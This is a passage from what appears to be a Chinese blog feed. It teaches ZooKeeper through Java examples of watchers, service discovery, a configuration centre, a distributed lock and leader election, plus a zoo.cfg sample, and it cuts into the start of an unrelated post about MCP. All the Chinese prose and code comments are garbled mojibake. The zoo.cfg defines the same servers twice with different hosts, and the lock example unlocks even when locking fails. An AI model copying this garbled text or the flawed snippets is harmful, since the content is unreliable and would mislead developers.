<span class="hljs-keyword">if</span> (stat != <span class="hljs-literal">null</span>) {
    zooKeeper.delete(<span class="hljs-string">"/config/old"</span>, stat.getVersion());
}

<span class="hljs-comment">// é€’å½’åˆ é™¤èŠ‚ç‚¹åŠå…¶å­èŠ‚ç‚¹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteRecursive</span><span class="hljs-params">(String path)</span> <span class="hljs-keyword">throws</span> Exception {
    List&lt;String&gt; children = zooKeeper.getChildren(path, <span class="hljs-literal">false</span>);
    <span class="hljs-keyword">for</span> (String child : children) {
        deleteRecursive(path + <span class="hljs-string">"/"</span> + child);
    }
    zooKeeper.delete(path, -<span class="hljs-number">1</span>);
}
</code></pre>
<h4 data-id="heading-17">3.6 è·å–å­èŠ‚ç‚¹åˆ—è¡¨</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è·å–å­èŠ‚ç‚¹åˆ—è¡¨</span>
List&lt;String&gt; children = zooKeeper.getChildren(<span class="hljs-string">"/services"</span>, <span class="hljs-literal">false</span>);

<span class="hljs-comment">// éå†å­èŠ‚ç‚¹</span>
<span class="hljs-keyword">for</span> (String child : children) {
    <span class="hljs-type">String</span> <span class="hljs-variable">childPath</span> <span class="hljs-operator">=</span> <span class="hljs-string">"/services/"</span> + child;
    <span class="hljs-type">byte</span>[] data = zooKeeper.getData(childPath, <span class="hljs-literal">false</span>, <span class="hljs-literal">null</span>);
    System.out.println(child + <span class="hljs-string">" -&gt; "</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(data));
}
</code></pre>
<h3 data-id="heading-18">å››ã€Watcherç›‘å¬æœºåˆ¶</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b9002527c5c4199bd90a255b0466c23~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768883596&amp;x-signature=s%2FScC%2FgY0nQwH76x4LSVszKL4Xc%3D" alt="" loading="lazy"/></p>
<p>Watcheræ˜¯ZooKeeperçš„æ ¸å¿ƒç‰¹æ€§ä¹‹ä¸€ï¼Œå…è®¸å®¢æˆ·ç«¯ç›‘å¬èŠ‚ç‚¹å˜åŒ–å¹¶æ¥æ”¶å®æ—¶é€šçŸ¥ã€‚</p>
<h4 data-id="heading-19">4.1 Watcherçš„å·¥ä½œåŸç†</h4>
<p><strong>é‡è¦ç‰¹æ€§ï¼š</strong></p>
<ol>
<li><strong>ä¸€æ¬¡æ€§è§¦å‘</strong>ï¼šWatcherè§¦å‘åè‡ªåŠ¨å¤±æ•ˆï¼Œéœ€è¦é‡æ–°æ³¨å†Œ</li>
<li><strong>é¡ºåºä¿è¯</strong>ï¼šå®¢æˆ·ç«¯ä¼šæŒ‰é¡ºåºæ”¶åˆ°Watcheräº‹ä»¶</li>
<li><strong>è½»é‡çº§</strong>ï¼šWatcheråªé€šçŸ¥äº‹ä»¶ç±»å‹ï¼Œä¸ä¼ é€’å…·ä½“æ•°æ®</li>
</ol>
<h4 data-id="heading-20">4.2 å¯ç›‘å¬çš„äº‹ä»¶ç±»å‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">EventType</span> {
    None(-<span class="hljs-number">1</span>),              <span class="hljs-comment">// è¿æ¥çŠ¶æ€å˜åŒ–</span>
    NodeCreated(<span class="hljs-number">1</span>),        <span class="hljs-comment">// èŠ‚ç‚¹è¢«åˆ›å»º</span>
    NodeDeleted(<span class="hljs-number">2</span>),        <span class="hljs-comment">// èŠ‚ç‚¹è¢«åˆ é™¤</span>
    NodeDataChanged(<span class="hljs-number">3</span>),    <span class="hljs-comment">// èŠ‚ç‚¹æ•°æ®è¢«ä¿®æ”¹</span>
    NodeChildrenChanged(<span class="hljs-number">4</span>),<span class="hljs-comment">// å­èŠ‚ç‚¹åˆ—è¡¨å˜åŒ–</span>
    DataWatchRemoved(<span class="hljs-number">5</span>),   <span class="hljs-comment">// Watcherè¢«ç§»é™¤</span>
    ChildWatchRemoved(<span class="hljs-number">6</span>)   <span class="hljs-comment">// å­èŠ‚ç‚¹Watcherè¢«ç§»é™¤</span>
}
</code></pre>
<h4 data-id="heading-21">4.3 Watcherä½¿ç”¨ç¤ºä¾‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfigWatcher</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Watcher</span> {
    <span class="hljs-keyword">private</span> ZooKeeper zooKeeper;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">process</span><span class="hljs-params">(WatchedEvent event)</span> {
        <span class="hljs-keyword">switch</span> (event.getType()) {
            <span class="hljs-keyword">case</span> NodeDataChanged:
                System.out.println(<span class="hljs-string">"é…ç½®æ•°æ®å·²å˜æ›´ï¼š"</span> + event.getPath());
                <span class="hljs-comment">// è¯»å–æ–°é…ç½®</span>
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-type">byte</span>[] data = zooKeeper.getData(event.getPath(), <span class="hljs-built_in">this</span>, <span class="hljs-literal">null</span>);
                    System.out.println(<span class="hljs-string">"æ–°é…ç½®ï¼š"</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(data));
                } <span class="hljs-keyword">catch</span> (Exception e) {
                    e.printStackTrace();
                }
                <span class="hljs-keyword">break</span>;

            <span class="hljs-keyword">case</span> NodeDeleted:
                System.out.println(<span class="hljs-string">"é…ç½®èŠ‚ç‚¹å·²åˆ é™¤"</span>);
                <span class="hljs-keyword">break</span>;

            <span class="hljs-keyword">default</span>:
                <span class="hljs-keyword">break</span>;
        }
    }
}
</code></pre>
<h4 data-id="heading-22">4.4 Watcherçš„æœ€ä½³å®è·µ</h4>
<ol>
<li><strong>æŒç»­ç›‘å¬</strong>ï¼šåœ¨Watcherå›è°ƒä¸­é‡æ–°æ³¨å†ŒWatcher</li>
<li><strong>å¼‚å¸¸å¤„ç†</strong>ï¼šå¤„ç†ConnectionLossã€SessionExpiredç­‰å¼‚å¸¸</li>
<li><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼šé¿å…è¿‡åº¦ä½¿ç”¨Watcherï¼Œåˆç†è®¾ç½®ç›‘å¬ç²’åº¦</li>
</ol>
<h3 data-id="heading-23">äº”ã€å®æˆ˜åº”ç”¨</h3>
<h4 data-id="heading-24">5.1 æœåŠ¡æ³¨å†Œä¸å‘ç°</h4>
<p><strong>åœºæ™¯æè¿°</strong>ï¼š
å¾®æœåŠ¡æ¶æ„ä¸­ï¼ŒæœåŠ¡æä¾›è€…å¯åŠ¨æ—¶å°†è‡ªå·±çš„åœ°å€æ³¨å†Œåˆ°ZooKeeperï¼ŒæœåŠ¡æ¶ˆè´¹è€…ä»ZooKeeperè·å–æœåŠ¡æä¾›è€…åˆ—è¡¨ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5778012a1c33423da2f3fe03fd282fb3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768883596&amp;x-signature=1RvktmrR9gM5L399GZG9rDfH6Is%3D" alt="" loading="lazy"/></p>
<p><strong>å®ç°æ–¹æ¡ˆ</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æœåŠ¡æä¾›è€…æ³¨å†Œ</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServiceProvider</span> {
    <span class="hljs-keyword">private</span> ZooKeeper zooKeeper;
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">servicePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">"/services/user-service"</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">register</span><span class="hljs-params">(String address)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// åˆ›å»ºä¸´æ—¶èŠ‚ç‚¹ï¼Œä¼šè¯æ–­å¼€åè‡ªåŠ¨åˆ é™¤</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> zooKeeper.create(
            servicePath + <span class="hljs-string">"/provider-"</span>,
            address.getBytes(),
            ZooDefs.Ids.OPEN_ACL_UNSAFE,
            CreateMode.EPHEMERAL_SEQUENTIAL
        );
        System.out.println(<span class="hljs-string">"æœåŠ¡æ³¨å†ŒæˆåŠŸï¼š"</span> + path);
    }
}

<span class="hljs-comment">// æœåŠ¡æ¶ˆè´¹è€…å‘ç°</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServiceConsumer</span> {
    <span class="hljs-keyword">private</span> ZooKeeper zooKeeper;

    <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">discover</span><span class="hljs-params">(String serviceName)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">"/services/"</span> + serviceName;
        List&lt;String&gt; providers = zooKeeper.getChildren(path, <span class="hljs-literal">false</span>);

        List&lt;String&gt; addresses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        <span class="hljs-keyword">for</span> (String provider : providers) {
            <span class="hljs-type">byte</span>[] data = zooKeeper.getData(path + <span class="hljs-string">"/"</span> + provider, <span class="hljs-literal">false</span>, <span class="hljs-literal">null</span>);
            addresses.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(data));
        }

        <span class="hljs-keyword">return</span> addresses;
    }
}
</code></pre>
<p><strong>ç”Ÿäº§ç¯å¢ƒå¢å¼º</strong>ï¼š</p>
<ol>
<li>æ·»åŠ è´Ÿè½½å‡è¡¡ç­–ç•¥ï¼ˆéšæœºã€è½®è¯¢ã€æœ€å°‘è¿æ¥ç­‰ï¼‰</li>
<li>å®ç°å¥åº·æ£€æŸ¥æœºåˆ¶</li>
<li>æ”¯æŒå¤šç‰ˆæœ¬æœåŠ¡å…±å­˜</li>
</ol>
<h4 data-id="heading-25">5.2 åˆ†å¸ƒå¼é…ç½®ä¸­å¿ƒ</h4>
<p><strong>åœºæ™¯æè¿°</strong>ï¼š
å¤šä¸ªå¾®æœåŠ¡å®ä¾‹éœ€è¦å…±äº«é…ç½®ï¼Œé…ç½®å˜æ›´åéœ€è¦å®æ—¶æ¨é€åˆ°æ‰€æœ‰å®ä¾‹ã€‚</p>
<p><strong>å®ç°æ–¹æ¡ˆ</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfigCenter</span> {
    <span class="hljs-keyword">private</span> ZooKeeper zooKeeper;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> ConfigData currentConfig;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(String configPath)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// ç›‘å¬é…ç½®å˜åŒ–</span>
        watchConfig(configPath);

        <span class="hljs-comment">// åŠ è½½åˆå§‹é…ç½®</span>
        loadConfig(configPath);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">watchConfig</span><span class="hljs-params">(String path)</span> <span class="hljs-keyword">throws</span> Exception {
        zooKeeper.exists(path, event -&gt; {
            <span class="hljs-keyword">if</span> (event.getType() == Event.EventType.NodeDataChanged) {
                <span class="hljs-keyword">try</span> {
                    loadConfig(path);
                    watchConfig(path);  <span class="hljs-comment">// é‡æ–°æ³¨å†ŒWatcher</span>
                } <span class="hljs-keyword">catch</span> (Exception e) {
                    e.printStackTrace();
                }
            }
        });
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loadConfig</span><span class="hljs-params">(String path)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">byte</span>[] data = zooKeeper.getData(path, <span class="hljs-literal">false</span>, <span class="hljs-literal">null</span>);
        <span class="hljs-type">ConfigData</span> <span class="hljs-variable">newConfig</span> <span class="hljs-operator">=</span> parseConfig(data);
        <span class="hljs-built_in">this</span>.currentConfig = newConfig;
        System.out.println(<span class="hljs-string">"é…ç½®å·²æ›´æ–°ï¼š"</span> + newConfig);
    }

    <span class="hljs-keyword">public</span> ConfigData <span class="hljs-title function_">getConfig</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> currentConfig;
    }
}
</code></pre>
<p><strong>é…ç½®æ ¼å¼ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"database"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"jdbc:mysql://localhost:3306/appdb"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"username"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"admin"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"password"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"password"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"redis"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"host"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"localhost"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"port"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">6379</span>
    <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-26">5.3 åˆ†å¸ƒå¼é”</h4>
<p><strong>åœºæ™¯æè¿°</strong>ï¼š
å¤šä¸ªæœåŠ¡å®ä¾‹åŒæ—¶æ“ä½œåŒä¸€èµ„æºæ—¶ï¼Œéœ€è¦ä½¿ç”¨åˆ†å¸ƒå¼é”ä¿è¯äº’æ–¥è®¿é—®ã€‚</p>
<p><strong>å®ç°æ–¹æ¡ˆ</strong>ï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cde69be7116e480cb92f17128becd001~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768883596&amp;x-signature=aUOtLiW0wmCjG1p93QCKwJbCRxc%3D" alt="" loading="lazy"/></p>
<p>ä½¿ç”¨ä¸´æ—¶é¡ºåºèŠ‚ç‚¹å®ç°å…¬å¹³é”ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DistributedLock</span> {
    <span class="hljs-keyword">private</span> ZooKeeper zooKeeper;
    <span class="hljs-keyword">private</span> String lockPath;
    <span class="hljs-keyword">private</span> String currentLock;

    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">lock</span><span class="hljs-params">(<span class="hljs-type">long</span> timeout, TimeUnit unit)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// åˆ›å»ºä¸´æ—¶é¡ºåºèŠ‚ç‚¹</span>
        currentLock = zooKeeper.create(
            lockPath + <span class="hljs-string">"/lock-"</span>,
            <span class="hljs-literal">null</span>,
            ZooDefs.Ids.OPEN_ACL_UNSAFE,
            CreateMode.EPHEMERAL_SEQUENTIAL
        );

        <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ˜¯æœ€å°çš„èŠ‚ç‚¹</span>
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            List&lt;String&gt; locks = zooKeeper.getChildren(lockPath, <span class="hljs-literal">false</span>);
            Collections.sort(locks);

            <span class="hljs-type">String</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> currentLock.substring(currentLock.lastIndexOf(<span class="hljs-string">'/'</span>) + <span class="hljs-number">1</span>);
            <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> locks.indexOf(current);

            <span class="hljs-keyword">if</span> (index == <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <span class="hljs-comment">// è·å¾—é”</span>
            }

            <span class="hljs-comment">// ç›‘å¬å‰ä¸€ä¸ªèŠ‚ç‚¹</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">previousLock</span> <span class="hljs-operator">=</span> locks.get(index - <span class="hljs-number">1</span>);
            <span class="hljs-keyword">final</span> <span class="hljs-type">CountDownLatch</span> <span class="hljs-variable">latch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CountDownLatch</span>(<span class="hljs-number">1</span>);

            <span class="hljs-type">Stat</span> <span class="hljs-variable">stat</span> <span class="hljs-operator">=</span> zooKeeper.exists(
                lockPath + <span class="hljs-string">"/"</span> + previousLock,
                event -&gt; {
                    <span class="hljs-keyword">if</span> (event.getType() == Event.EventType.NodeDeleted) {
                        latch.countDown();
                    }
                }
            );

            <span class="hljs-keyword">if</span> (stat == <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">continue</span>;  <span class="hljs-comment">// å‰ä¸€ä¸ªèŠ‚ç‚¹å·²ä¸å­˜åœ¨ï¼Œé‡æ–°æ£€æŸ¥</span>
            }

            <span class="hljs-comment">// ç­‰å¾…å‰ä¸€ä¸ªèŠ‚ç‚¹é‡Šæ”¾</span>
            latch.await(timeout, unit);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        zooKeeper.delete(currentLock, -<span class="hljs-number">1</span>);
    }
}
</code></pre>
<p><strong>ä½¿ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">DistributedLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DistributedLock</span>(zk, <span class="hljs-string">"/locks/order-resource"</span>);

<span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">if</span> (lock.lock(<span class="hljs-number">10</span>, TimeUnit.SECONDS)) {
        <span class="hljs-comment">// æ‰§è¡Œä¸šåŠ¡é€»è¾‘</span>
        processOrder();
    }
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}
</code></pre>
<p><strong>é”çš„å®ç°è¦ç‚¹</strong>ï¼š</p>
<ol>
<li>ä½¿ç”¨ä¸´æ—¶é¡ºåºèŠ‚ç‚¹é¿å…ç¾Šç¾¤æ•ˆåº”</li>
<li>åªç›‘å¬å‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œè€Œéæ‰€æœ‰èŠ‚ç‚¹</li>
<li>å®¢æˆ·ç«¯å¼‚å¸¸æ–­å¼€æ—¶ï¼Œé”ä¼šè‡ªåŠ¨é‡Šæ”¾</li>
<li>ä½¿ç”¨Curatoræ¡†æ¶å¯ä»¥ç®€åŒ–å®ç°</li>
</ol>
<h4 data-id="heading-27">5.4 Leaderé€‰ä¸¾</h4>
<p><strong>åœºæ™¯æè¿°</strong>ï¼š
åœ¨é›†ç¾¤ç¯å¢ƒä¸­ï¼Œéœ€è¦ä»å¤šä¸ªèŠ‚ç‚¹ä¸­é€‰å‡ºä¸€ä¸ªLeaderèŠ‚ç‚¹è´Ÿè´£æ‰§è¡Œç‰¹å®šä»»åŠ¡ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/741ef00b3f2a43168986e8e812a38bbc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768883596&amp;x-signature=szCvi2sK2awrcfsYQ1B37OIuFr4%3D" alt="" loading="lazy"/></p>
<p><strong>å®ç°æ–¹æ¡ˆ</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LeaderElection</span> {
    <span class="hljs-keyword">private</span> ZooKeeper zooKeeper;
    <span class="hljs-keyword">private</span> String electionPath;
    <span class="hljs-keyword">private</span> String currentNode;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">elect</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// åˆ›å»ºä¸´æ—¶é¡ºåºèŠ‚ç‚¹</span>
        currentNode = zooKeeper.create(
            electionPath + <span class="hljs-string">"/node_"</span>,
            <span class="hljs-literal">null</span>,
            ZooDefs.Ids.OPEN_ACL_UNSAFE,
            CreateMode.EPHEMERAL_SEQUENTIAL
        );

        <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ˜¯Leader</span>
        checkLeader();

        <span class="hljs-comment">// ç›‘å¬å‰ä¸€ä¸ªèŠ‚ç‚¹</span>
        watchPreviousNode();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkLeader</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        List&lt;String&gt; nodes = zooKeeper.getChildren(electionPath, <span class="hljs-literal">false</span>);
        Collections.sort(nodes);

        <span class="hljs-type">String</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> currentNode.substring(currentNode.lastIndexOf(<span class="hljs-string">'/'</span>) + <span class="hljs-number">1</span>);
        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> nodes.indexOf(current);

        <span class="hljs-keyword">if</span> (index == <span class="hljs-number">0</span>) {
            onBecomeLeader();
        } <span class="hljs-keyword">else</span> {
            onBecomeFollower();
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onBecomeLeader</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"æˆä¸ºLeaderèŠ‚ç‚¹"</span>);
        <span class="hljs-comment">// å¼€å§‹æ‰§è¡ŒLeaderä»»åŠ¡</span>
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onBecomeFollower</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"æˆä¸ºFollowerèŠ‚ç‚¹"</span>);
        <span class="hljs-comment">// ç­‰å¾…Leaderå˜æ›´</span>
    }
}
</code></pre>
<h3 data-id="heading-28">å…­ã€æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-29">6.1 éƒ¨ç½²æ¶æ„</h4>
<p><strong>é›†ç¾¤è§„æ¨¡</strong>ï¼š</p>
<ul>
<li>å¼€å‘ç¯å¢ƒï¼š3èŠ‚ç‚¹ï¼ˆå…è®¸1ä¸ªèŠ‚ç‚¹æ•…éšœï¼‰</li>
<li>ç”Ÿäº§ç¯å¢ƒï¼š5-7èŠ‚ç‚¹ï¼ˆå…è®¸2-3ä¸ªèŠ‚ç‚¹æ•…éšœï¼‰</li>
<li>é¿å…ä½¿ç”¨å¶æ•°ä¸ªèŠ‚ç‚¹</li>
</ul>
<p><strong>æœåŠ¡å™¨é…ç½®</strong>ï¼š</p>
<ul>
<li>CPUï¼š4æ ¸ä»¥ä¸Š</li>
<li>å†…å­˜ï¼š4GBä»¥ä¸Š</li>
<li>ç£ç›˜ï¼šä½¿ç”¨SSDï¼Œæ•°æ®ç›®å½•ç‹¬ç«‹</li>
<li>ç½‘ç»œï¼šä½å»¶è¿Ÿã€é«˜å¸¦å®½</li>
</ul>
<h4 data-id="heading-30">6.2 é…ç½®ä¼˜åŒ–</h4>
<p><strong>zoo.cfgå…³é”®é…ç½®</strong>ï¼š</p>
<pre><code class="hljs language-properties" lang="properties"># åŸºæœ¬é…ç½®
tickTime=2000                              # å¿ƒè·³æ—¶é—´é—´éš”ï¼ˆæ¯«ç§’ï¼‰
initLimit=10                               # åˆå§‹åŒæ­¥æ—¶é™ï¼ˆtickTimeå€æ•°ï¼‰
syncLimit=5                                # æ•°æ®åŒæ­¥æ—¶é™ï¼ˆtickTimeå€æ•°ï¼‰
dataDir=/var/lib/zookeeper                 # æ•°æ®ç›®å½•
clientPort=2181                            # å®¢æˆ·ç«¯è¿æ¥ç«¯å£

# é›†ç¾¤é…ç½®
server.1=zk1:2888:3888                     # èŠ‚ç‚¹1é…ç½®
server.2=zk2:2888:3888                     # èŠ‚ç‚¹2é…ç½®
server.3=zk3:2888:3888                     # èŠ‚ç‚¹3é…ç½®

# æ€§èƒ½ä¼˜åŒ–
maxClientCnxns=60                          # æœ€å¤§å®¢æˆ·ç«¯è¿æ¥æ•°
autopurge.snapRetainCount=3                # ä¿ç•™å¿«ç…§æ•°é‡
autopurge.purgeInterval=1                  # æ¸…ç†é—´éš”ï¼ˆå°æ—¶ï¼‰
preAllocSize=64M                           # é¢„åˆ†é…äº‹åŠ¡æ—¥å¿—å¤§å°

# é›†ç¾¤é…ç½®ï¼ˆ3èŠ‚ç‚¹é›†ç¾¤ç¤ºä¾‹ï¼‰
server.1=192.168.1.101:2888:3888
server.2=192.168.1.102:2888:3888
server.3=192.168.1.103:2888:3888
</code></pre>
<h4 data-id="heading-31">6.3 å®¢æˆ·ç«¯é…ç½®</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç”Ÿäº§ç¯å¢ƒæ¨èçš„å®¢æˆ·ç«¯é…ç½®</span>
<span class="hljs-keyword">public</span> ZooKeeper <span class="hljs-title function_">createProductionClient</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException {
    <span class="hljs-comment">// è¿æ¥å­—ç¬¦ä¸²ï¼šæ‰€æœ‰é›†ç¾¤èŠ‚ç‚¹</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">connectionString</span> <span class="hljs-operator">=</span> <span class="hljs-string">"zk1:2181,zk2:2181,zk3:2181"</span>;

    <span class="hljs-comment">// ä¼šè¯è¶…æ—¶ï¼šæ ¹æ®ä¸šåŠ¡åœºæ™¯è®¾ç½®</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">sessionTimeout</span> <span class="hljs-operator">=</span> <span class="hljs-number">30000</span>;  <span class="hljs-comment">// 30ç§’</span>

    <span class="hljs-comment">// è¿æ¥è¶…æ—¶</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">connectionTimeout</span> <span class="hljs-operator">=</span> <span class="hljs-number">10000</span>; <span class="hljs-comment">// 10ç§’</span>

    <span class="hljs-type">ZooKeeper</span> <span class="hljs-variable">zk</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZooKeeper</span>(
        connectionString,
        sessionTimeout,
        event -&gt; handleEvent(event)
    );

    <span class="hljs-keyword">return</span> zk;
}
</code></pre>
<h3 data-id="heading-32">ä¸ƒã€æ€»ç»“</h3>
<p>ZooKeeperä½œä¸ºåˆ†å¸ƒå¼åè°ƒæœåŠ¡ï¼Œåœ¨å¾®æœåŠ¡ã€å¤§æ•°æ®ã€åˆ†å¸ƒå¼ç³»ç»Ÿä¸­æ‰®æ¼”ç€é‡è¦è§’è‰²ã€‚ä¸»è¦åŠŸèƒ½ç‚¹ï¼š</p>
<ol>
<li><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>ï¼šæ•°æ®æ¨¡å‹ã€èŠ‚ç‚¹ç±»å‹ã€Watcheræœºåˆ¶</li>
<li><strong>åŸºæœ¬æ“ä½œ</strong>ï¼šå¢åˆ æ”¹æŸ¥ã€æƒé™æ§åˆ¶</li>
<li><strong>å®æˆ˜åº”ç”¨</strong>ï¼šæœåŠ¡å‘ç°ã€é…ç½®ä¸­å¿ƒã€åˆ†å¸ƒå¼é”ã€Leaderé€‰ä¸¾</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MCP æ˜¯æœ€å¤§éª—å±€ï¼ŸSkills æ‰æ˜¯æ•‘æ˜Ÿï¼Ÿ]]></title>    <link>https://juejin.cn/post/7594420277449015323</link>    <guid>https://juejin.cn/post/7594420277449015323</guid>    <pubDate>2026-01-13T04:44:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594420277449015323" data-draft-id="7594398051722182694" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MCP æ˜¯æœ€å¤§éª—å±€ï¼ŸSkills æ‰æ˜¯æ•‘æ˜Ÿï¼Ÿ"/> <meta itemprop="keywords" content="MCP,Agent,VibeCoding"/> <meta itemprop="datePublished" content="2026-01-13T04:44:40.000Z"/> <meta itemprop="image" 